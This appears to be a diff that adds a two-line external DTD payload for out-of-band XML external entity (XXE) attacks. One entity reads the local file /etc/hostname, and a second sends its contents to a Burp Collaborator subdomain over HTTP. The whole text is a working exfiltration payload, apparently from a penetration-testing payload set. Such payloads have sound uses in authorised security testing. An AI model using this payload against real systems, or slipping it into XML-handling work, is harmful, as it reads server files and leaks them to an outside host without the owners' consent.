@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % all "<!ENTITY  send SYSTEM 'http://dasd3.u1w0qu2lgl5if9j34sloe5r1hsnjsfi37.burpcollaborator.net/xxe-hostname-200.dtd?%file;'>">
